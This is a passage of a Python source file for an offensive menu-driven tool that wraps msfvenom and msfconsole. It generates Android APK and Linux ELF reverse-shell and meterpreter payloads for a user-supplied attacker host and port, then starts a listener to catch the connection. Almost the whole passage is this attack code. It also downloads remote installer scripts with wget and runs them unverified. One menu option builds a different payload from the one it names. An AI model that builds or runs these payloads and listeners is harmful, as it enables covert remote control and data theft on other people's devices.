    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "android/meterpreter/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()



  if crandroget == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################# Starting Listner #####################")
      pay = "android/meterpreter_reverse_http"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()

  if crandroget == "8":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "android/meterpreter_reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      menu()

  if crandroget == "9":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "android/meterpreter_reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()

  else:
    menu()



def crlinux():
  start()
  pubip()
  slowprint(colors.green + """
[1]  linux/x86/shell/reverse_tcp
[2]  linux/x86/meterpreter_reverse_http
[3]  linux/x86/meterpreter_reverse_https
[4]  linux/x86/meterpreter_reverse_tcp
[5]  linux/x64/shell/reverse_tcp
[6]  linux/x64/meterpreter_reverse_http
[7]  linux/x64/meterpreter_reverse_https
[8]  linux/x64/meterpreter_reverse_tcp

[00] Back

""")
  crlinuxget = str(input("\033[37m[\033[31m+\033[37m] Linux > "))
  if crlinuxget  == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform linux -f elf -p linux/x86/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "linux/x86/shell/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()

  if crlinuxget  == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################# Generating Payload ###################")
    print("\n")
    os.system("msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "linux/x86/meterpreter_reverse_http"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()

  if crlinuxget  == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############# Payload Generating Success ###############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "linux/x86/meterpreter_reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()

  if crlinuxget  == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################# Generating Payload ###################")
    print("\n")
    os.system("msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "linux/x86/meterpreter_reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      menu()

  if crlinuxget  == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "######################## Starting ######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform linux -f elf -p linux/x64/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############# Payload Generating Success ###############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "linux/x64/shell/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      menu()

  if crlinuxget  == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################# Generating Payload ###################")
    print("\n")
    os.system("msfvenom --platform linux -f elf -p linux/x64/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "################### Starting Listner ####################")
      pay = "linux/x64/shell/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      menu()

  if crlinuxget  == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "######################## Starting ######################") 
    print("\n")
    slowprint2(colors.red     + "################# Generating Payload ###################")
    print("\n")
    os.system("msfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############# Payload Generating Success ###############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "################# Starting Listner #####################")
      pay = "linux/x64/meterpreter_reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()

  if crlinuxget  == "8":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "######################## Starting ######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "linux/x64/meterpreter_reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      menu()

  else:
    menu()

def exit():
  slowprint2(colors.red + " [!] Stoping Script [!]")
  time.sleep(2)
  os.system("pg_ctl -D $PREFIX/var/lib/postgresql stop")
  os.system("apt clean")
  quit()

def dbstart():
  slowprint2(colors.green + " [ ✔ ] SERVICE MSFDB STARTING")
  time.sleep(1)
  slowprint2(colors.green + " [ ✔ ] SERVICE POSTGRSQL STARTING")
  os.system('initdb $PREFIX/var/lib/postgresql > /dev/null 2>&1 ')
  os.system('pg_ctl -D $PREFIX/var/lib/postgresql start > /dev/null 2>&1')
  slowprint2(colors.green + " [ ✔ ] SERVICE POSTGRSQL STARTED")
  time.sleep(2)

def msfinstall():
  start()
  msfi = input(colors.green + " [ + ] Are you sure to Install Metasploit ? <y/n> ")
  if msfi == "y" or msfi == "Y" or msfi == "yes" or msfi == "YES" or msfi == "Yes":
    os.system('cd $HOME')
    os.system('apt install wget')
    os.system('wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh')
    os.system('chmod +x metasploit.sh')
    os.system('./metasploit.sh')
  else:
    menu()

if os.system("which msfconsole >/dev/null 2>&1") == 0:
  slowprint2(colors.green + " [ ✔ ] Metasploit-Framework Found")
  time.sleep(1)
  pass
else:
  slowprint2(colors.green + " [ x ] Metasploit-Framework Not Found")
  time.sleep(2)
  msfinstall()

def apkmodins():
  start()
  amins = input(colors.green + " [ + ] Are you sure to Install APKMOD ? <y/n> ")
  if amins == "y" or amins == "Y" or amins == "yes" or amins == "YES" or amins == "Yes":
    os.system('cd $HOME')
    os.system('wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh')
    os.system('sh setup.sh')
    time.sleep(5)
  else:
    menu()

if os.system("which apkmod >/dev/null 2>&1") == 0:
  slowprint2(colors.green + " [ ✔ ] Apkmod Found")
  time.sleep(1)
  pass
else:
  slowprint2(colors.green + " [ x ] Apkmod Not Found")
  time.sleep(2)
  apkmodins()

def program():
    try:
      dbstart()
      menu()
    except KeyboardInterrupt:
      con = input(colors.red + "\n\n [c] Continue [q] Quit : ")
      if con == "c" or con == "C" or con == "continue" or con == "Continue":
        menu()
      else:
        exit()
	
if '__main__' == __name__:
	program()
